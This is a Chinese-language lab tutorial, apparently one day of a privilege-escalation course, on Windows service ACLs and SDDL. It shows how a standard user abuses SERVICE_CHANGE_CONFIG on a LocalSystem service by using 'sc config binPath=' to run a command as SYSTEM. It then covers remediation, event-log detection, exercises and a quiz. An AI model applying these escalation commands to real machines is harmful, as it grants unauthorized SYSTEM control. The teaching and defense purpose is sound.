# Day 16：Windows Service ACL — 能控制 Service，就可能控制 SYSTEM 嗎？

## 開場情境

你是 `fei-student`，一個 Windows 上的 Standard User。不是 Administrator，也不是 SYSTEM。

你跑了 `sc query` 看到一堆 Service，其中有一個叫 `FEITrainingService`，它以 **LocalSystem** 身分運行。

你心想：「我只是普通使用者，應該什麼都改不了吧？」

真的嗎？

---

## 今天要解決的問題

1. Windows Service 的權限模型到底長什麼樣子？
2. Service Control Manager (SCM) 怎麼決定誰能做什麼？
3. `SDDL` 到底在寫什麼？
4. 「Service 以 SYSTEM 執行」本身是不是漏洞？

---

## 背景知識：Windows Service 架構

### 什麼是 Windows Service？

Windows Service 是一種在背景持續運作的程式。你的防毒軟體、Windows Update、印表機服務，都是 Service。

每個 Service 有三個關鍵屬性：

| 屬性 | 說明 | 查詢方式 |
|------|------|---------|
| **Service Name** | 內部名稱 | `sc qc <name>` |
| **binPath** | 執行的程式路徑 | `sc qc <name>` |
| **Service Account** | 以誰的身分執行 | `SERVICE_START_NAME` |

### Service Control Manager (SCM)

![Service Control Manager](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day16-service-acl-diagram-01.png)


SCM 是 Windows 管理所有 Service 的核心元件，住在 `services.exe` 裡：


SCM 的角色：
- 讀取 `HKLM\SYSTEM\CurrentControlSet\Services\<name>` 的設定
- 依據 `ObjectName`（Service Account）啟動 `ImagePath`（binPath）
- 管理 Service 的 start / stop / pause
- **SCM 不會驗證 binPath 指向的程式是否安全** — 這是管理員的責任

### 為什麼 LocalSystem 重要？

| Service Account | 權限等級 | 說明 |
|-----------------|----------|------|
| **LocalSystem** | 最高 | 等同 NT AUTHORITY\SYSTEM，可存取所有本機資源 |
| LocalService | 低 | 有限的本機存取 |
| NetworkService | 低 | 有限的本機存取，網路以機器帳戶存取 |

以 LocalSystem 執行的 Service，如果你能控制它的 binPath，新的程式也會以 SYSTEM 執行。

---

## OS 原理：Service Security Descriptor 與 SDDL

### 每個 Service 都有自己的 ACL

就像檔案有 NTFS ACL，每個 Service 也有自己的 **Security Descriptor**。這個 Descriptor 決定：

- 誰可以查詢 Service 狀態？
- 誰可以啟動 / 停止它？
- **誰可以修改它的設定？** ← 這就是 `SERVICE_CHANGE_CONFIG`

### SDDL 語法

用 `sc sdshow <service>` 可以看到 SDDL（Security Descriptor Definition Language）：

```
D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPDTLOCRSDRCWDWO;;;BU)
```

看起來像亂碼？來拆解：

每個括號是一條 ACE（Access Control Entry），格式是：

```
(AceType;;AccessMask;;;SID)
```

| 代碼 | 意義 |
|------|------|
| A | Allow |
| CC | SERVICE_QUERY_CONFIG |
| DC | **SERVICE_CHANGE_CONFIG** ← 關鍵！ |
| LC | SERVICE_QUERY_STATUS |
| RP | SERVICE_START |
| WP | SERVICE_STOP |

SID 縮寫：

| 縮寫 | 身分 |
|------|------|
| SY | SYSTEM |
| BA | Built-in Administrators |
| BU | Built-in Users |
| IU | Interactive Users |

所以當你看到 `BU` 的 ACE 中包含 `DC`，就代表：**所有一般使用者都能修改這個 Service 的設定**。

---

## FEI Lab 環境

```
🔬 FEI Lab 環境
VM: FEI-PRIVESC-WINDOWS
OS: Windows 10 Pro (Build 19045)
IP: 192.168.77.20
起始帳號: fei-student (Standard User)
目標: SYSTEM
Flag: C:\FEI-PrivEsc\Flags\fei-w01-system-flag.txt
Scenario: FEI-W01-SERVICE-ACL
```



### 場景準備

`powershell
# 1. 以 fei-labadmin 登入 Windows VM（VMware Console）
# 密碼：FEI-LabAdmin-2026!

# 2. 以系統管理員開啟 PowerShell，進入場景目錄
cd C:\FEI-PrivEsc\Scenarios\FEI-W01-SERVICE-ACL

# 3. 執行 setup
.\fei-setup.ps1

# 4. 確認場景就緒
.\fei-verify.ps1
# 應看到 W01-SERVICE-ACL STATUS: READY

# 5. 登出，改以 fei-student 登入
# 密碼：FEI-Student-2026!
`

### 部署過程

setup 腳本做了什麼：

1. 用 `csc.exe` 編譯一個合法的 Windows Service exe
2. `sc.exe create FEITrainingService` 建立 Service（以 LocalSystem 執行）
3. 用 `sc.exe sdset` 設定 SDDL — **故意讓 Built-in Users (BU) 擁有完整控制權限**
4. 建立 Flag 檔案（只有 Administrators + SYSTEM 可讀）
5. 啟動 Service

---

## 如果我是攻擊者，我現在想知道什麼？

### 問題 1：有哪些 Service 以 SYSTEM 執行？

```cmd
sc qc FEITrainingService
```

```
SERVICE_NAME: FEITrainingService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\FEI-PrivEsc\Scenarios\FEI-W01-SERVICE-ACL\bin\FEITrainingService.exe
        DISPLAY_NAME       : FEI PrivEsc Training Service
        SERVICE_START_NAME : LocalSystem
```

> `SERVICE_START_NAME: LocalSystem` — 這個 Service 以最高權限執行。

### 問題 2：我能改它嗎？

```cmd
sc config FEITrainingService binPath= "test"
```

```
[SC] ChangeServiceConfig 成功
```

> 如果回傳「成功」而不是「存取被拒」— 你已經可以控制一個 SYSTEM Service 的執行路徑。

### 問題 3：Flag 能直接讀嗎？

```cmd
type "C:\FEI-PrivEsc\Flags\fei-w01-system-flag.txt"
```

```
存取被拒。
```

> 不行。需要 SYSTEM 權限才能讀。

---

## Attack Reasoning

![Service ACL Attack Reasoning](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day16-service-acl-diagram-02.png)



---

## 實際攻擊流程（Actual Output）

### Step 1：修改 binPath

```cmd
sc config FEITrainingService binPath= "cmd.exe /c type C:\FEI-PrivEsc\Flags\fei-w01-system-flag.txt > C:\Users\fei-student\Desktop\flag.txt"
```

```
[SC] ChangeServiceConfig 成功
```

### Step 2：重啟 Service

```cmd
sc stop FEITrainingService
sc start FEITrainingService
```

`sc start` 回報 error 1053（逾時）— 這是正常的。`cmd.exe` 不是標準 Service，但指令已經以 SYSTEM 執行了。

### Step 3：讀取 Flag

```cmd
type C:\Users\fei-student\Desktop\flag.txt
```

```
FEI{WINDOWS_W01_SYSTEM_ACCESS}
```

---

## Attack Path

![Service ACL Attack Path](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day16-service-acl-diagram-03.png)



---

## 為什麼它真的成立？

壞掉的不是 Windows Service 架構本身。壞掉的是**這條信任鏈**：

1. SCM 信任 Service 的 binPath 設定
2. binPath 可以被 fei-student 修改（因為 SDDL 給了 BU `SERVICE_CHANGE_CONFIG`）
3. SCM 以 LocalSystem 啟動 binPath 指向的程式
4. **SCM 不會驗證 binPath 的合法性** — 它只管啟動

> 真正的 Root Cause 不是「Service 以 SYSTEM 執行」，而是「低權限使用者被授予了修改 SYSTEM Service 設定的權限」。

---

## False Positive 分析

### 「Service running as SYSTEM」= 漏洞？

**不是。** 大多數核心 Windows Service 都以 SYSTEM 執行。這本身完全正常。

真正危險的組合是：

```
SYSTEM Service
+
低權限使用者有 SERVICE_CHANGE_CONFIG
=
Privilege Escalation
```

如果你用自動化掃描工具列出所有 SYSTEM Service 就直接報漏洞，會產生大量 False Positive。

### 如何區分？

| 情況 | 是否危險？ |
|------|-----------|
| SYSTEM Service，ACL 只給 Administrators | ❌ 正常 |
| SYSTEM Service，ACL 給 Users START/STOP 但沒有 CHANGE_CONFIG | ❌ 正常 |
| SYSTEM Service，ACL 給 Users CHANGE_CONFIG | ✅ **危險** |
| SYSTEM Service，ACL 給 Everyone FullControl | ✅ **非常危險** |

---

## Edge Case

### sc.exe 語法陷阱

```cmd
sc config FEITrainingService binPath="cmd.exe"     ← 錯誤！少一個空格
sc config FEITrainingService binPath= "cmd.exe"    ← 正確！= 後面要有空格
```

這個空格是 sc.exe 的歷史設計問題，非常容易中招。

### Error 1053 是正常的

當你的 binPath 指向 `cmd.exe`（不是標準 Service 程式），SCM 會在 30 秒後逾時報 1053。但指令已經以 SYSTEM 權限執行完畢了。

### Service 重啟問題

如果 Service 有 Recovery 設定（失敗後自動重啟），你修改 binPath 後它可能被自動觸發。Lab 環境中我們關閉了這個功能。

---

## Troubleshooting

| 問題 | 原因 | 解決 |
|------|------|------|
| `sc config` 回傳「存取被拒」 | Service ACL 沒有給 CHANGE_CONFIG | 確認 SDDL 中 BU 的 ACE 包含 DC |
| Flag 是空的 | binPath 中的引號或路徑有誤 | 檢查 `> output` 的完整路徑 |
| `sc start` 報 1053 | cmd.exe 不是標準 Service | 這是預期行為，指令已執行 |
| Desktop 裡沒有 flag.txt | 路徑拼錯或 Desktop 不存在 | 改用 `C:\Users\Public\flag.txt` |
| Service 無法 stop | 另一個 process 持有 handle | 等幾秒再試 |

---

## 防禦（Defense）

### Root Cause

管理員在建立 Service 時，授予了 `Built-in Users` 群組 `SERVICE_CHANGE_CONFIG` 權限。

### 真正該修的

移除 BU 的寫入權限：

```cmd
sc sdset FEITrainingService "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)"
```

這個 SDDL 只保留：
- SYSTEM: 完整控制
- Administrators: 完整控制
- Interactive Users: 查詢和列舉（唯讀）

---

## Detection（偵測）

| Event | ID | 說明 |
|-------|-----|------|
| Service 設定被修改 | 4657 | Registry 的 Service key 被修改 |
| 新 Service 建立 | 7045 | System Event Log |
| Service 啟動 | 7036 | Service 狀態變更 |
| sc.exe 被執行 | 4688 | Process Creation（需要啟用稽核） |

建議的偵測邏輯：

```
IF EventID=4657
AND RegistryPath CONTAINS "CurrentControlSet\Services"
AND RegistryValue = "ImagePath"
AND User NOT IN (Administrators, SYSTEM)
THEN ALERT
```

---

## Fix Verification（修復驗證）

修復後，以 `fei-student` 驗證：

```cmd
sc config FEITrainingService binPath= "test"
```

預期回應：

```
[SC] OpenService 無法 5:
存取被拒。
```

如果還是回傳「成功」，表示修復不完整。

---

## FEI Lab 工程筆記

### SDDL 中缺少 DC 的故事

原始設計中，setup 腳本設定的 BU ACE 是：

```
(A;;CCLCSWRPWPDTLOCRSDRCWDWO;;;BU)
```

部署到 VM 後跑 verify → 全部 PASS。

接著以 `fei-student` 執行 `sc config` → **存取被拒**！

為什麼 verify 說 PASS 但實際卻被拒？

**原因**：SDDL 中漏了 `DC`（SERVICE_CHANGE_CONFIG）。上面那串字母看起來很長，給了 START、STOP、DELETE、READ、WRITE_DAC、WRITE_OWNER... 但就是沒有 `DC`。

**修正**：

```
原始：CCLCSWRPWPDTLOCRSDRCWDWO
修正：CCDCLCSWRPWPDTLOCRSDRCWDWO
         ^^
         加入 DC
```

**教訓**：

> SDDL 是一個很容易搞錯的格式。每個兩字元代碼代表一個特定權限，少了任何一個都會導致預期外的行為。這也是為什麼「看起來像 FullControl」和「真的有 ChangeConfig」不一定相同。

---

## Exercise（練習）

### 練習 1：解讀 SDDL

以下 SDDL 中，`fei-student`（屬於 BU 群組）有哪些操作權限？

```
D:(A;;CCLCSWRPWPLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPLOCRRC;;;BU)
```

### 解答

BU 的 ACE 是 `CCLCSWRPWPLOCRRC`：
- CC: QUERY_CONFIG
- LC: QUERY_STATUS
- SW: ENUMERATE_DEPENDENTS
- RP: **START** ✓
- WP: **STOP** ✓
- LO: INTERROGATE
- CR: USER_DEFINED_CONTROL
- RC: READ_CONTROL

沒有 DC（CHANGE_CONFIG）。所以 fei-student 可以 start/stop 但**不能修改** Service 設定。


### 練習 2：如果 binPath 指向一個不存在的路徑

如果你 `sc config FEITrainingService binPath= "C:\doesnotexist.exe"`，然後 `sc start`，會發生什麼？

### 解答

SCM 會回報錯誤（通常是 Error 2 — 找不到指定的檔案）。Service 不會啟動。這代表你的 binPath 必須指向一個實際存在的可執行檔。使用 `cmd.exe /c <command>` 是因為 `cmd.exe` 一定存在。


---

## Quiz

**Q1**: 以下哪個是最直接的提權條件？

A. Service 以 SYSTEM 執行
B. fei-student 可以 `sc query` 查看 Service
C. fei-student 對 Service 有 `SERVICE_CHANGE_CONFIG`
D. Service 的 exe 存放在 `C:\Program Files`

### 答案C。SERVICE_CHANGE_CONFIG 讓低權限使用者可以修改 SYSTEM Service 的 binPath。A 本身不是漏洞（大多數核心 Service 都以 SYSTEM 執行），B 是唯讀操作，D 是路徑位置不影響 ACL。

**Q2**: `sc start` 報錯 1053 代表什麼？

A. 指令沒有執行
B. 權限不足
C. 程式不是標準 Service，逾時
D. Service 已經在執行

### 答案C。Error 1053 是「服務未以適時方式回應」，因為 cmd.exe 不是標準 Service 程式。但指令已經以 SYSTEM 權限執行完畢了。



## 場景收尾

做完後記得 reset：

`powershell
# 以 fei-labadmin 的系統管理員 PowerShell
cd C:\FEI-PrivEsc\Scenarios\FEI-W01-SERVICE-ACL
.\fei-reset.ps1
.\fei-verify.ps1 -Mode reset
# 應看到 W01-SERVICE-ACL STATUS: RESET
`

---

## 今天真正要記住的 3 件事

1. **Service 以 SYSTEM 執行不是漏洞**。真正危險的是低權限使用者對它有 `SERVICE_CHANGE_CONFIG`。
2. **SDDL 的每個兩字元代碼都代表一個特定權限**。少一個 `DC` 就等於沒有 `CHANGE_CONFIG`。
3. **SCM 不驗證 binPath 的內容**。它只負責以設定的帳戶啟動設定的程式。

---

## 給自己的問題

> 如果 Service ACL 完全安全（fei-student 不能 `sc config`），但 Service 執行的 exe 檔案本身的 NTFS ACL 有問題呢？

這就是明天的主題：**Service Binary ACL**。

---

## 下一篇

Day 17：Service 本身不能改，但它執行的 EXE 可以改呢？
